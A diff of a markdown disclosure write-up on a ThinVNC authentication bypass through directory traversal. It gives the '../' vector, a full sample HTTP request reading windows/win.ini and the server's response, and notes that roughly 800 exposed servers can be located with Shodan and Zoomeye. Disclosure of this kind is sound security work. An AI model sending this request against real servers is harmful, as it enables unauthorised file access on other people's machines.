@@ -19,12 +19,13 @@ ThinVNC uses Basic Authentication to authenticate a user to access the web VNC i
 A sample authentication screen looks like this:
 [photo of auth-1]
 
-When tried with multiple with wrong authentication credentials, it throws a HTTP 401 error. This can be bypassed using the following vector:
-<b> /../../../../../../../../../windows/win.ini </b>
+When tried with multiple with wrong authentication credentials, it throws a HTTP 401 error. This can be bypassed using the following vector: <br>
+<b>**/../../../../../../../../../windows/win.ini** </b>
 
 <h4>Sample Request:</h4>
 
-GET /admin/../../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
+```
+GET /xyz/../../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
 Host: 192.168.40.1:5888
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -32,8 +33,10 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
-
+```
 <h4>Sample Response: </h4>
+
+```
 HTTP/1.1 200
 Content-Type: application/binary
 Content-Length: 96
@@ -46,7 +49,8 @@ Connection: Keep-Alive
 [files]
 [Mail]
 MAPI=1
-test
+```
+
 [insert BURP Screenshot here]
 <br>
 
@@ -55,12 +59,16 @@ This directory traversal attack vector allows us to read any arbitrary file on t
 
 
 <h3> POC: </h3>
+My friend [@\_WarMarx\_] (https://twitter.com/\_WarMarX\_) on Twitter and I have written a tiny POC for this issue. 
 
 <h3> ThinVNC in the wild  </h3>
 There are roughly 800 accessible ThinVNC servers exposed over internet. You can use the following queries on Shondan and Zoomeye to identiify the vulnearble servers. 
 [zoomeye ss]
 [shodan ss]
 
-SourceForge Page suggests that there are 208 downloads/week on an average. 
+SourceForge Page suggests that there are 219 downloads / week on an average of this VNC software. 
+
+<h4> Conclusion </h4>
+Do not use legacy software, even though there are no POC's or CVE's available on those software, they might be vulnerable to some issue. Always keep yourself and your software updated. Cheers :)
 
 
